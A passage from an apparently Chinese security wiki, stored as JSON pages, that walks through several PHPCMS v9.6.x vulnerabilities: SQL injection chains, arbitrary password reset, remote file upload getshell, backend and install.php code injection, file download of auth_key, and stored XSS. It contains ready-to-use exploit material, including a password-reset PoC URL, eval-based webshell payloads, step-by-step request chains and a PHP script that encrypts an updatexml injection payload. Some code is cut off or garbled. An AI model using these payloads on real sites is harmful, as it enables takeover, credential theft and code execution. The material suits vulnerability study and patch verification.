phpcms/modules/wap/index.php 文件，在该文件中 $_GET[\\'siteid\\'] 可控，并且可以通过 cookie 获得加密后的数据，但是这里有 intval 过滤，所以无法放置我们的 payload 。 我们继续寻找，会发现 phpcms/modules/attachment/attachments.php 文件的 swfupload_json 方法有满足我们需要的代码。程序将可控数据放在了 cookie ，其中可控数据中，比较好利用的是 $_GET[\\'src\\'] 。 $_GET[\\'src\\'] 只是经过了 safe_replace 函数的过滤，该函数会将某些字符替换为空，而我们却可以在 payload 中插入这些字符，从而绕过黑名单的过滤。 safe_replace 函数代码如下： 貌似现在已经找到了利用链了？别高兴的太早。在调用这个 swfupload_json 方法之前，程序会执行 attachments 类的 __construct 方法，而这个方法中有用户登录状态检测。用于登录状态检测的 $this->userid 可以来自 sys_auth($_POST[\\'userid_flash\\'],\\'DECODE\\') ，即我们让 $_POST[\\'userid_flash\\'] 经过 sys_auth 方法解密之后有东西即可。而这个加密数据，就可以利用我们上面说到的 phpcms/modules/wap/index.php 文件。通过 cookie 获取 $_GET[\\'siteid\\'] 加密后的数据，然后再作为 $_POST[\\'userid_flash\\'] 的值，即可绕过登录检测。 绕过登录检测后，我们将 payload 传给 phpcms/modules/attachment/attachments.php 文件 swfupload_json 方法中的 $_GET[\\'src\\'] ，再利用开头 parse_str 函数进行变量覆盖，最终完成整个漏洞链。整个漏洞的利用流程图如下： 按照默认配置安装的网站搭建好后， WAP 是处于禁用状态，但是这并不影响我们获得加密后的 $_GET[\\'siteid\\'] 。 我们再来假设，如果网站管理员删除了 WAP 模块的代码，这个洞还能利用吗？我们可以继续来挖掘一下这个漏洞链的其他入口，这也是网络上未公开的一个入口点。上面我们在搜索 set_cookie 方法找可控数据时，会发现 phpcms/modules/mood/index.php 文件的 post 方法可以直接获得一个加密后的数据，这样我们就可以将这个数据，用在漏洞链的第二步：绕过用户登录验证，具体代码如下： 这里只要按照代码逻辑，构造参数即可。这里可能还要注意本类的 __construct 方法，同样按照逻辑构造参数即可，具体构造这里不再赘述。 通过上面这个漏洞链入口，我们便可以进行 报错SQL注入 。比较有意思的是， PHPCMS 会将 admin 登录的 cookie 存储在数据库中，我们可以通过注入获取管理员 cookie ，然后伪造管理员身份利用后台 getshell 。这里如何伪造身份，网络上貌似提及很少，唯一找到一篇文章https://www.secpulse.com/archives/57486.html ，发现作者竟然还少提及了一个关键参数。于是我将伪造的数据包，与正常登录的数据包进行对比，逐个删除 cookie 中的数据，看看少了哪个关键参数。接下来，我们来具体看一下如何伪造 cookie 进入后台。 PHPCMS 专门在数据库中建了一个表来存放 PHPSESSID ，其中也包含管理员的 PHPSESSID ，且登录状态下的 userid 字段会被设为1，注销则为0，具体如下： 我们把 PHPSESSID=9t9mrk25ak5sb9v60nc255ql11 加到 cookie 中，直接访问后台，这是发现程序还是会让你登录，估计我们是少了什么，下面来动态调试一下。经过调试，我们会发现程序终止在了 admin 类 __construct 方法的 self::check_admin() 语句中，其具体代码如下： 可以明显看到，我们原先的 cookie 中少了 $userid 对应的字段，而且要想绕过登录，必须保证 $_SESSION[\\'roleid\\'] 和 $userid 相等且它们两者非空。那么现在，我们只要加上 $userid 对应字段就行了，其值可以从上面漏洞链第一步中的响应包 Set-Cookie 字段获取。这里要注意一个点，一旦管理员注销，我们就无法利用这个点伪造 cookie 了，这也是这个漏洞的鸡肋之处。 最后来看一下官方发布的 PHPCMS v9.6.1 中是如何修复这个漏洞的，补丁如下： 可以看到官方对解密后的数据进行了 safe_replace、intval 双重过滤处理。 参考链接 https://xz.aliyun.com/t/5730 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:00:22 "},"Web安全/Phpcms/Phpcms V9.6.0 任意密码重置漏洞/Phpcms V9.6.0 任意密码重置漏洞.html":{"url":"Web安全/Phpcms/Phpcms V9.6.0 任意密码重置漏洞/Phpcms V9.6.0 任意密码重置漏洞.html","title":"Phpcms V9.6.0 任意密码重置漏洞","keywords":"","body":"Phpcms V9.6.0 任意密码重置漏洞 一、漏洞简介 二、漏洞影响 Phpcms V9.6.0 三、复现过程 漏洞分析 /phpcms/modules/member/index.php 第267到312行 public function send_newmail() { $_username = param::get_cookie('_regusername'); $_userid = param::get_cookie('_reguserid'); $_ssouid = param::get_cookie('_reguseruid'); $newemail = $_GET['newemail']; if($newemail==''){//邮箱为空，直接返回错误 return '2'; } $this->_init_phpsso(); $status = $this->client->ps_checkemail($newemail); if($status=='-5'){//邮箱被占用 exit('-1'); } if ($status==-1) { $status = $this->client->ps_get_member_info($newemail, 3); if($status) { $status = unserialize($status); //接口返回序列化，进行判断 if (!isset($status['uid']) || $status['uid'] != intval($_ssouid)) { exit('-1'); } } else { exit('-1'); } } //验证邮箱格式 pc_base::load_sys_func('mail'); $code = sys_auth($_userid.'|'.microtime(true), 'ENCODE', get_auth_key('email')); $url = APP_PATH.\"index.php?m=member&c=index&a=register&code=$code&verify=1\"; //读取配置获取验证信息 $member_setting = getcache('member_setting'); $message = $member_setting['registerverifymessage']; $message = str_replace(array('{click}','{url}','{username}','{email}','{password}'), array(''.L('please_click').'',$url,$_username,$newemail,$password), $message); if(sendmail($newemail, L('reg_verify_email'), $message)){ //更新新的邮箱，用来验证 $this->db->update(array('email'=>$newemail), array('userid'=>$_userid)); $this->client->ps_member_edit($_username, $newemail, '', '', $_ssouid); $return = '1'; }else{ $return = '2'; } echo $return; } 　　$_userid用 param::get_cookie('_reguserid') 来获取 跟进去：/phpv9.6.0/phpcms/libs/classes/param.class.php 第106-117行。 public static function get_cookie($var, $default = '') { $var = pc_base::load_config('system','cookie_pre').$var; $value = isset($_COOKIE[$var]) ? sys_auth($_COOKIE[$var], 'DECODE') : $default; if(in_array($var,array('_userid','userid','siteid','_groupid','_roleid'))) { $value = intval($value); } elseif(in_array($var,array('_username','username','_nickname','admin_username','sys_lang'))) { // site_model auth $value = safe_replace($value); } return $value; } 　　这时候的$var的值是_reguserid， 然后获取前缀。pc_base::load_config('system','cookie_pre') 　　$var的值就变成了gggCB__reguserid，然后进到sys_auth($_COOKIE[$var], 'DECODE'),由于这个值我们是可控的，那找个可控的地方加密一下，也就是注册的时候，把名字注册成1xxxx(为什么是这样的后面会说) ，然后他会对username进行加密，我们只要注册一个号，然后复制出里面username的值就行。 接着有个if判断，这就是我说文章分析错的地方，这里的$var的值是gggCB__reguserid，根本不在后面的这个数组里面，所以进入不到$value = intval($value); 所以不能intval出数字来，所以文章分析错了，但是还是能密码重置。接着看，返回了$value的值，也就是1xxxx。 省略中间的运行：来到304行，看这句 $this->db->update(array('email'=>$newemail), array('userid'=>$_userid)); 进行update操作，$newemail的值是我们给的，$_userid是 1xxxx 。 跟进去形成sql修改。语句是这样的。 UPDATE `phpcms`.`v9_member` SET [email protected]/* */' WHERE `userid` = '1xxxx' 然后在mysql中，where 1 = \\'1sFdsfdsf\\' 是相等的，因为后面的字符串转为了数组1 所以他的语句就变成了 UPDATE `phpcms`.`v9_member` SET [email protected]/* */' WHERE `userid` = '1' 然后重置掉了用户userid为1 的用户 2.png 漏洞复现 大概的攻击流程是这样的。 注册一个1xxx ，然后获取cookie中的username的值，然后切换一个浏览器，再次打开网页，在f12中，设置cookie的值，注意__reguserid前面的gggCB也要和username的值一样 document.cookie='gggCB__reguserid=2f22C0FxoGesxWq73GqUXpuJBDAAEO_KZL5MuEDDeaEj9w' 然后访问 /index.php?m=member&c=index&a=send_newmail&siteid=1&newemail=q12[email protected]/* */ 看到页面返回1就代表成功了，然后就去 /index.php?m=member&c=index&a=public_forget_password&siteid=1 输入你的邮箱 重置掉userid=1的密码。 最终poc为 https://www.0-sec.org/index.php?m=member&c=index&a=send_newmail&siteid=[email protected]/* */ 参考链接 https://www.cnblogs.com/yangxiaodi/p/6890298.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:00:28 "},"Web安全/Phpcms/Phpcms v9.6.0 任意文件上传/Phpcms v9.6.0 任意文件上传.html":{"url":"Web安全/Phpcms/Phpcms v9.6.0 任意文件上传/Phpcms v9.6.0 任意文件上传.html","title":"Phpcms v9.6.0 任意文件上传","keywords":"","body":"Phpcms v9.6.0 任意文件上传 一、漏洞简介 二、漏洞影响 Phpcms v9.6.0 三、复现过程 这个漏洞存在于用户注册处。这里有一个可控变量 $_POST[\\'info\\'] 传入了 member_input 类的 get 方法中，跟进该方法。(下图对应文件位置：phpcms/modules/member/index.php) 在 get 方法中，我们发现 $data 变量来自 $_POST[\\'info\\'] ，并且我们可以调用 member_input 类的所有方法（对应下图 第47-48行 代码）。(下图对应文件位置：caches/caches_model/caches_data/member_input.class.php) 看了一下 member_input 类的所有方法，只有一个 editor 方法比较好利用，而本次漏洞正是利用到这个方法。在这个方法中，调用了 attachment 类的 download 方法。(下图对应文件位置：caches/caches_model/caches_data/member_input.class.php) 在 download 方法中，程序先使用正则对图片 URL 进行匹配，其中 $ext 只允许为gif|jpg|jpeg|bmp|png ，而我们使用 http://xxxx/1.php?a.jpg 或者 http://xxxx/1.php#a.jpg 即可绕过正则。(下图对应文件位置：phpcms/libs/classes/attachment.class.php) 接着又使用 fillurl 方法对匹配到的远程图片地址进行处理，其实就是将 # 号之后的字符全部去除，例如 http://xxxx/1.php#a.jpg 会被处理成 http://xxxx/1.php 。(下图对应文件位置：phpcms/libs/classes/attachment.class.php) fillurl 方法处理后，又回到了 download 方法。程序直接调用 copy 函数将远程文件复制到本地（对应下图 161 行代码），远程文件名可预测，后缀名为上边处理后的 URL 文件名后缀，即 php ，最终导致 getshell 。其中 webshell 地址为 http://website/uploadfile/date('Y/md/')/date('Ymdhis').rand(100, 999).\\'.\\'.$fileext 。(下图对应文件位置：phpcms/libs/classes/attachment.class.php) 最后我们再来看一下在官方发布的 PHPCMS v9.6.1 中是如何修复这个漏洞的，代码具体如下。可以明确看到，在官方补丁中，对 fileext($file) 获取到的文件后缀进行了黑名单校验。虽然暂时不能直接上传 shell ，但是还是可以上传图片马。如果 CMS 存在任意文件包含或任意文件名修改的漏洞，同样还是可以 getshell ，这里最好再对远程图片的内容进行校验下比较好。(下图对应文件位置：phpcms/libs/classes/attachment.class.php，左半图为PHPCMSv9.6.0，右半图为PHPCMSv9.6.1) 实际上，单这个补丁中的正则来说，是可以绕过的，例如： .php%7f ，Windows下会将非法字符替换成空，但是其实后续还有一系列的问题，导致我没绕过。本以为要挖到0day了，我傻乐了半天：) 参考链接 https://xz.aliyun.com/t/5730 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:00:30 "},"Web安全/Phpcms/Phpcms V9.6.0 数据库备份爆破/Phpcms V9.6.0 数据库备份爆破.html":{"url":"Web安全/Phpcms/Phpcms V9.6.0 数据库备份爆破/Phpcms V9.6.0 数据库备份爆破.html","title":"Phpcms V9.6.0 数据库备份爆破","keywords":"","body":"Phpcms V9.6.0 数据库备份爆破 一、漏洞简介 二、漏洞影响 Phpcms V9.6.0 三、复现过程 #!/usr/bin/env python # coding=utf-8 '''/* * author = Mochazz * team = 红日安全团队 * env = pyton3 * */ ''' import requests import itertools characters = \"abcdefghjklmnopqrstuvwxyz0123456789_!#\" backup_sql = \"\" payload = \"/api.php?op=creatimg&txt=mochazz&font=/../../../../caches/bakup/default/{location}结果为： C:\\Users\\dell\\Desktop>python Zxc.py [+] 前缀为： 1 [+] 12 [+] 123 [+] 1231 [+] 12312 [+] 123123 [+] 1231231 [+] 12312312 [+] 123123123 备份sql文件地址为： 123123123.sql Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:00:33 "},"Web安全/Phpcms/Phpcms v9.6.0后台getshell/Phpcms v9.6.0后台getshell.html":{"url":"Web安全/Phpcms/Phpcms v9.6.0后台getshell/Phpcms v9.6.0后台getshell.html","title":"Phpcms v9.6.0后台getshell","keywords":"","body":"Phpcms v9.6.0后台getshell 一、漏洞简介 phpsso_server 后台getshell 二、漏洞影响 Phpcms v9.6.0 三、复现过程 漏洞来自于ROOTDIR/phpsso_server/phpcms/modules/admin/system.php public function uc() { if (isset($_POST['dosubmit'])) { $data = isset($_POST['data']) ? $_POST['data'] : ''; $data['ucuse'] = isset($_POST['ucuse']) && intval($_POST['ucuse']) ? intval($_POST['ucuse']) : 0; $filepath = CACHE_PATH.'configs'.DIRECTORY_SEPARATOR.'system.php'; $config = include $filepath; $uc_config = ' $v) { $old[] = \"'$k'=>'\".(isset($config[$k]) ? $config[$k] : $v).\"',\"; $new[] = \"'$k'=>'$v',\"; $uc_config .= \"define('\".strtoupper($k).\"', '$v');\\n\"; } $html = file_get_contents($filepath); $html = str_replace($old, $new, $html); $uc_config_filepath = CACHE_PATH.'configs'.DIRECTORY_SEPARATOR.'uc_config.php'; @file_put_contents($uc_config_filepath, $uc_config); @file_put_contents($filepath, $html); $this->db->insert(array('name'=>'ucenter', 'data'=>array2string($data)), 1,1); showmessage(L('operation_success'), HTTP_REFERER); } $data = array(); $r = $this->db->get_one(array('name'=>'ucenter')); if ($r) { $data = string2array($r['data']); } include $this->admin_tpl('system_uc'); } 来自这段中的 $data = isset($_POST[\\'data\\']) ? $_POST[\\'data\\'] : \\'\\'; 和 foreach ($data as $k => $v) {$old[] = \\\"\\'$k\\'=>\\'\\\".(isset($config[$k]) ? $config[$k] : $v).\\\"\\',\\\";$new[] = \\\"\\'$k\\'=>\\'$v\\',\\\";$uc_config .= \\\"define(\\'\\\".strtoupper($k).\\\"\\', \\'$v\\');\\n\\\";} 这里接收post[\\'data\\']数据中的key，value并写入配置文件ROOTDIR/phpsso_server/caches/configs/uc_config.php中 在ROOTDIR/phpcms/libs/classes/param.class.php中 public function __construct() { if(!get_magic_quotes_gpc()) { $_POST = new_addslashes($_POST); $_GET = new_addslashes($_GET); $_REQUEST = new_addslashes($_REQUEST); $_COOKIE = new_addslashes($_COOKIE); } 全局过滤了post，但是这里只过滤了value，并没有过滤key 在这个地方，我们可以构造 name=\"data[uc_api','11');/*]\" 并在Ucenter api 地址输入: */eval($_REQUEST[test]);// 再进行缓存更新 就成功写入了一句话 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:00:34 "},"Web安全/Phpcms/Phpcms v9.6.1 任意文件读取/Phpcms v9.6.1 任意文件读取.html":{"url":"Web安全/Phpcms/Phpcms v9.6.1 任意文件读取/Phpcms v9.6.1 任意文件读取.html","title":"Phpcms v9.6.1 任意文件读取","keywords":"","body":"Phpcms v9.6.1 任意文件读取 一、漏洞简介 二、漏洞影响 Phpcms v9.6.1 三、复现过程 这个版本的 任意文件读取 漏洞和上个版本的 SQL注入 漏洞原理是类似的，且出问题的文件均在 phpcms/modules/content/down.php 中。在该文件的 download 方法中最后一行调用了 file_down 文件下载函数，我们可以看到其第一个参数是要读取的文件路径。 我们再来看看 download 方法中有哪些限制条件。可以看到其开头部分的代码，和上一个版本的 SQL注入 类似，唯一不同的是这里加解密的 key 变成了 $pc_auth_key ，我们等下就要来找找使用 $pc_auth_key 进行加密的可控点。继续看 download 方法，里面对要下载的文件后缀进行了黑名单校验，但是末尾又对 >\\ 字符进行替换，这就导致后缀名正则可被绕过，例如： **.ph 。(下图对应文件位置：phpcms/modules/content/down.php) 现在我们就要来找找使用 $pc_auth_key 作为加密 key 的可控点。通过搜索关键字，我们可以看到有三处地方。然而前两处地方是不可以利用的，因为都有登录检测。而第三个点就可以利用，我们看其中 $i、$d、$s 作为明文字符串被加密。(下图对应文件位置：phpcms/modules/content/down.php) 有了加密字符串，我们如何能够从前台获取呢，这里其实在最后一行包含模板文件时，将加密字符串 $downurl 输出了，这样也就解决了我们获取的问题。 那 $i、$d、$s 这三个变量从哪里来？我们往前看，代码有没有相当熟悉？这里只对 $i 进行了 intval 过滤，其他两个变量还是可以利用。而且加密字符串 $a_k 的获取，就和上个版本的 SQL注入 漏洞攻击链的前2步是一样的，这里不再赘述。(下图对应文件位置：phpcms/modules/content/down.php) 我们在构造 payload 的时候，我们要注意整个攻击过程会经过两次 safe_replace 、两次 parse_str 、一次 str_replace(array(\\'\\\\'), \\'\\',$fileurl) ，而程序对 .. 和 php 字符进行了检测。所以我们要想访问 php 文件或进行路径穿越，后缀可以设置成 ph>p ，路径符可以变成 .>. 。但是 safe_replace 函数会 str_replace(\\'>\\',\\'>\\',$string) ，所以 > 字符需要编码两次，变成 %25253e 。 我们可以将整个漏洞的触发过程整理成下图： 最后来看一下官方发布的 PHPCMS v9.6.2 中是如何修复这个漏洞的，补丁如下： 可以看到补丁将后缀匹配规则放在离下载文件最近的地方，貌似能防止规则中的文件被读取，但是我们可以利用 windows 的特性，在 windows 下绕过这个正则，这也是网传的一种 PHPCMS v9.6.2任意文件下载 漏洞。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:00:36 "},"Web安全/Phpcms/Phpcms v9.6.2 任意文件下载/Phpcms v9.6.2 任意文件下载.html":{"url":"Web安全/Phpcms/Phpcms v9.6.2 任意文件下载/Phpcms v9.6.2 任意文件下载.html","title":"Phpcms v9.6.2 任意文件下载","keywords":"","body":"Phpcms v9.6.2 任意文件下载 一、漏洞简介 二、漏洞影响 三、复现过程 第一步:进行如下请求获得YDVIB_siteid的值。 请求： [GET]http://127.0.0.1/code/phpcms_v9.6.2_UTF8/index.php?m=wap&c=index&a=init&siteid=1 获得： [cookie]YDVIB_siteid:75d1XCnlbSh-1zi2xZ-gearAbSsmOcXypuSKXZst 第二步:在[POST DATA] 中的userid_flash参数的值设置为，第一步请求得到的YDVIB_siteid参数的值，并进行如下请求。 请求： [GET] http://127.0.0.1/code/phpcms_v9.6.2_UTF8/index.php?m=attachment&c=attachments&a=swfupload_json&src=a%26i=1%26m=1%26catid=1%26f=./caches/configs/system.ph%253ep%2581%26modelid=1%26d=1&aid=1 [POST DATA] userid_flash=75d1XCnlbSh-1zi2xZ-gearAbSsmOcXypuSKXZst 获得： [cookie] YDVIB_att_json:ea6fUlmiupVPoK2udMAztI7dpqUURRW1plemEGmRhGPocAvwWbcMk3BARFHzxLI4NJrV1IJQ2PaHeec790iDdhRJ9dJbhEKamgM55SwKR-F3fFmmWDOVuHnyiWg9kyMzQ2l9D_cRPQmM7P9e7ZYrESNQwjMOytrFTIhY4SFmK2Vjc3GS3g 第三步:将GET请求中的a_k参数的值设置为第二步请求获得的YDVIB_att_json参数的值，并进行如下请求。 请求： [get] http://127.0.0.1/code/phpcms_v9.6.2_UTF8/index.php?m=content&c=down&a=init&a_k=41f4VsAhLvN8-4L1ntgSsuga4BrvYA5zcDo2bjiYB7RI98Qzj5D5k8dqqBfo7cUNwF3TGhz1SH-vPs3lIIQJYwHeF_u2b3QVfD2HIO3Gay68TAtz2rqYhX8XIeznWrTtOI24418KZUoTEAfnY4kZNtIajW-bqHRV1djqmEc1hSAwkIYWA9CPrw 获得： http://127.0.0.1/code/phpcms_v9.6.2_UTF8/index.php?m=content&c=down&a=download&a_k=7e9d9SFk0jOteAemg-j7IVn6Ph1JFU9FEkyDo9xeasNJDPgZsOhusc39D4KiHzydJwt2B4iLuu-l9w03UV47obM9nsnjcJxi2jbawvqfZWcY9PeL3j0MgKxAvgXL4-dbf8gGG6_EJXIOA2p9Jkl9QcM 最后点击\"点击下载\"的按钮进行如下请求，便可以下载/caches/configs/system.php文件，得到里面的'auth_key' http://127.0.0.1/code/phpcms_v9.6.2_UTF8/index.php?m=content&c=down&a=download&a_k=7e9d9SFk0jOteAemg-j7IVn6Ph1JFU9FEkyDo9xeasNJDPgZsOhusc39D4KiHzydJwt2B4iLuu-l9w03UV47obM9nsnjcJxi2jbawvqfZWcY9PeL3j0MgKxAvgXL4-dbf8gGG6_EJXIOA2p9Jkl9QcM 参考链接 https://www.freebuf.com/column/158352.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:00:40 "},"Web安全/Phpcms/Phpcms v9.6.2 前台sql注入/Phpcms v9.6.2 前台sql注入.html":{"url":"Web安全/Phpcms/Phpcms v9.6.2 前台sql注入/Phpcms v9.6.2 前台sql注入.html","title":"Phpcms v9.6.2 前台sql注入","keywords":"","body":"Phpcms v9.6.2 前台sql注入 一、漏洞简介 二、漏洞影响 Phpcms v9.6.2 三、复现过程 漏洞分析 这个版本的的注入，是建立在任意文件读取漏洞存在的情况下才可利用。通过任意文件读取漏洞获得加解密的 key 值，我们可以用这个 key 加密我们的 SQL注入payload 。由于程序对解密后的数据并未过滤，最终导致漏洞发生。严格上来讲 v9.6.2 版本的注入只能在 windows 上利用，具体原因在上面的任意文件读取漏洞分析时也说了。下面我们来具体分析一下这个漏洞。 漏洞文件位于 phpcms/modules/member/classes/foreground.class.php ，代码如下图。我们可以明显看到下图第33行，程序直接将解密后的数据未经过滤直接带入查询。而待解密数据 $phpcms_auth 和解密秘钥 $auth_key 均可构造。 我们先来看一下待解密数据 $phpcms_auth 如何构造。从下图中，可以看出程序将从 cookie 中的 xxx_auth 字段经过 sys_auth 函数解密后，返回给了 $phpcms_auth ，而默认情况下使用 pc_base::load_config(\\'system\\', \\'auth_key\\') 作为加解密的 key 值。 而 pc_base::load_config(\\'system\\', \\'auth_key\\') 的值在网站搭建好后，会存储在 caches/configs/system.php 中，我们可以通过任意文件读取来获得这个值。 现在 $phpcms_auth 已经搞定了，我们再来看看 $auth_key = get_auth_key(\\'login\\') 如何构造，跟进 get_auth_key 的代码。我们可以看到 $auth_key 由 $prefix、pc_base::load_config(\\'system\\',\\'auth_key\\')、ip() 三个元素决定。前两个都是已知的，而第三个获取用户IP的函数存在IP伪造的问题，也可以是固定的。 所以 get_auth_key(\\'login\\') 的值也是我们可以构造的，剩下的事情只要我们将 payload 传给加密函数加密两次即可。我们最后再来看一下 PHPCMS v9.6.3 中是如何修复这个漏洞的，补丁如下： 可以明显看到，补丁将解密后获得的 $userid 进行了强转。 漏洞复现 分析完毕后得到大致流程： 解密操作：get_cookie('auth') 得到$phpcms_auth，get_auth_key('login')得到$auth_key，然后sys_auth($phpcms_auth, 'DECODE', $auth_key)。 再通俗些的话：sys_auth方法对cookie中包含auth的参数名对应的密文值，先使用配置文件中的auth_key进行sys_auth得到的值作为第一次解密后的值，然后使用配置文件中的auth_key的值与客户端请求的IP拼接做MD5加密的值做为新的key，第一次解密后的值与新的key最后传入sys_auth进行解密得到最终的明文。 反之加密方法便是： 使用配置文件中的auth_key的值与客户端请求的IP拼接做MD5加密的值做为新的key，使用新的key与明文进行sys_auth得到的值作为第一次加密的密文，然后使用配置文件中的auth_key作为key与第一次加密的密文传入sys_auth得到的值作为最终的密文，也就是cookie字段名称中包含auth的参数对应的值。 如下是将各个文件中的加密解密方法抓取出来稍作修改，在本地进行payload的加解密操作： 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) { return substr($result, 26); } else { return ''; } } else { return $keyc.rtrim(strtr(base64_encode($result), '+/', '-_'), '='); } } function get_auth_key($prefix,$suffix=\"\",$ip='127.0.0.1',$auth_key='7G6idVtMAxhgFVu5vGp1') { if($prefix=='login'){ $pc_auth_key = md5($auth_key.$ip); }else if($prefix=='email'){ $pc_auth_key = md5($auth_key); }else{ $pc_auth_key = md5($auth_key.$suffix); } $authkey = md5($prefix.$pc_auth_key); return $authkey; } //解密过程 //step 1 $encryption_str = '6fc7TB1Y1nIRK5HunMc5HAUw5WkBLLuQGBiOISDhJM4d8N8WHHOvqMaUSyWrZdVdH046oGv_e_Ir6Q157UV-yT5Aksuc_h_4RfwZqsEwDHfQckv4SReOiYFxm083X7Tydcw-nUy8l3nP-ouUGl59sN4'; $operation1 = 'DECODE'; $decryption_step1 = (sys_auth($encryption_str, $operation1)); echo 'decryption_step1 result:'.$decryption_step1.\"\\n\"; //step 2 $decryption_step2 = $decryption_step1; $auth_key = get_auth_key('login'); echo 'decryption_step2 result:'.sys_auth($decryption_step2, 'DECODE', $auth_key).\"\\n\"; echo '-----------------------'.\"\\n\" ; //加密过程 //step 1 $clear_str = \"1'or updatexml(1,concat(0x7e,(select user()),0x7e),1) or '1 f867fef04bd76d95abe01300951ca336\"; $operation2 = 'ENCODE'; $encryption_step1 = sys_auth($clear_str, 'ENCODE', $auth_key); echo 'encryption_step1 result:'.$encryption_step1.\"\\n\"; //step 2 $encryption_step2 = (sys_auth($encryption_step1, $operation2)); echo 'encryption_step2 result:'.$encryption_step2; 使用上面的代码可以进行解密和加密，下图中decryption_step2 result的值便是对payload进行解密的最终结果，encryption_step2的值是对payload进行加密的最终结果。 最终利用的现象，cookie中的YDVIB_auth参数名称，前缀是安装时候生成的可能不一样，可以在配置文件中找到对应的值，可以先注册普通用户然后看服务端下发的cookie中字段名称中xxx_auth的参数名称，便是存在漏洞的位置。 参考链接 https://www.freebuf.com/column/158352.html https://xz.aliyun.com/t/5731 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:00:42 "},"Web安全/Phpcms/Phpcms V9.6.3 install.php 没有即使删除导致的getshell/Phpcms V9.6.3 install.php 没有即使删除导致的getshell.html":{"url":"Web安全/Phpcms/Phpcms V9.6.3 install.php 没有即使删除导致的getshell/Phpcms V9.6.3 install.php 没有即使删除导致的getshell.html","title":"Phpcms V9.6.3 install.php 没有即使删除导致的getshell","keywords":"","body":"Phpcms V9.6.3 install.php 没有即使删除导致的getshell 一、漏洞简介 比较鸡肋，需要在环境安装好了之后，install.php也没有被删除，才可以利用 二、漏洞影响 Phpcms \\ 三、复现过程 POST /install/install.php?step=installmodule module=admin&dbport=3306&pconnect=eval($_GET[\"a\"]) 这里控制的是 pconnect参数，因为默认它没有单引号比较好调试。注意这里如果不传dbport参数的话database.php里的port参数会置空，将会报错。就无法执行到后面的 eval了 被修改后的database.php： url：/caches/configs/database.php Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:00:46 "},"Web安全/Phpcms/Phpcms V9.6.3 储存型xss/Phpcms V9.6.3 储存型xss.html":{"url":"Web安全/Phpcms/Phpcms V9.6.3 储存型xss/Phpcms V9.6.3 储存型xss.html","title":"Phpcms V9.6.3 储存型xss","keywords":"","body":"Phpcms V9.6.3 储存型xss 一、漏洞简介 二、漏洞影响 Phpcms V9.6.3 三、复现过程 漏洞分析 问题出在会员的积分兑换功能，文件： /phpcms/modules/member/index.php public function change_credit() { $memberinfo = $this->memberinfo; //加载用户模块配置 $member_setting = getcache('member_setting'); $this->_init_phpsso(); $setting = $this->client->ps_getcreditlist(); $outcredit = unserialize($setting); $setting = $this->client->ps_getapplist(); $applist = unserialize($setting); if(isset($_POST['dosubmit'])) { //本系统积分兑换数 $fromvalue = intval($_POST['fromvalue']); //本系统积分类型 $from = $_POST['from']; $toappid_to = explode('_', $_POST['to']); //这个是问题的参数 //目标系统appid $toappid = $toappid_to[0]; //目标系统积分类型 $to = $toappid_to[1]; if($from == 1) { if($memberinfo['point'] client->ps_changecredit($memberinfo['phpssouid'], $from, $toappid, $to, $fromvalue); 这里有个问题，由于if($memberinfo['point'] 所以，$fromvalue不能大于会员的点数，但是没充值的状态下，点数是为0的，但是又由于上面有intval($fromvalue)，所以我们可以$fromvalue=0.9经过intval后就成了0，也就绕过了上面的逻辑。跟进ps_changecredit函数： public function ps_changecredit($uid, $from, $toappid, $to, $credit) { return $this->_ps_send('changecredit', array('uid'=>$uid, 'from'=>$from, 'toappid'=>$toappid, 'to'=>$to, 'credit'=>$credit)); } 继续跟进_ps_send函数： private function _ps_send($action, $data = null) { return $this->_ps_post($this->ps_api_url.\"/index.php?m=phpsso&c=index&a=\".$action, 500000, $this->auth_data($data)); } 最后是经过auth_data函数处理和加密，auth_data调用sys_auth加密函数进行加密: public function auth_data($data) { $s = $sep = ''; foreach($data as $k => $v) { if(is_array($v)) { $s2 = $sep2 = ''; foreach($v as $k2 => $v2) { $s2 .= \"$sep2{$k}[$k2]=\".$this->_ps_stripslashes($v2); $sep2 = '&'; } $s .= $sep.$s2; } else { $s .= \"$sep$k=\".$this->_ps_stripslashes($v); } $sep = '&'; } $auth_s = 'v='.$this->ps_vsersion.'&appid='.APPID.'&data='.urlencode($this->sys_auth($s)); return $auth_s; } _ps_post函数主要就是让服务器访问自己的网站上的一个地址也就是访问了phpsso的changecredit函数（方法）。我们先来看看phpsso： class phpsso { public $db, $settings, $applist, $appid, $data; /** * 构造函数 */ public function __construct() { $this->db = pc_base::load_model('member_model'); pc_base::load_app_func('global'); /*获取系统配置*/ $this->settings = getcache('settings', 'admin'); $this->applist = getcache('applist', 'admin'); if(isset($_GET) && is_array($_GET) && count($_GET) > 0) { foreach($_GET as $k=>$v) { if(!in_array($k, array('m','c','a'))) { $_POST[$k] = $v; } } } if(isset($_POST['appid'])) { $this->appid = intval($_POST['appid']); } else { exit('0'); } if(isset($_POST['data'])) { parse_str(sys_auth($_POST['data'], 'DECODE', $this->applist[$this->appid]['authkey']), $this->data); parse_str(sys_auth($_POST['data'], 'DECODE', $this->applist[$this->appid]['authkey']), $this->data);可以看到是通过sys_auth函数解密（加密跟解密的函数是一样的）。 最后来看看changecredit： public function changecredit() { $this->uid = isset($this->data['uid']) ? $this->data['uid'] : exit('0'); $this->toappid = isset($this->data['toappid']) ? $this->data['toappid'] : exit('0'); $this->from = isset($this->data['from']) ? $this->data['from'] : exit('0'); $this->to = isset($this->data['to']) ? $this->data['to'] : exit('0'); $this->credit = isset($this->data['credit']) ? $this->data['credit'] : exit('0'); $this->appname = $this->applist[$this->appid]['name']; $outcredit = $this->getcredit(1); //目标系统积分增加数 $this->credit = floor($this->credit * $outcredit[$this->from.'_'.$this->to]['torate'] / $outcredit[$this->from.'_'.$this->to]['fromrate']); /*插入消息队列*/ $noticedata['appname'] = $this->appname; $noticedata['uid'] = $this->uid; $noticedata['toappid'] = $this->toappid; $noticedata['totypeid'] = $this->to; $noticedata['credit'] = $this->credit; messagequeue::add('change_credit', $noticedata); exit('1'); } 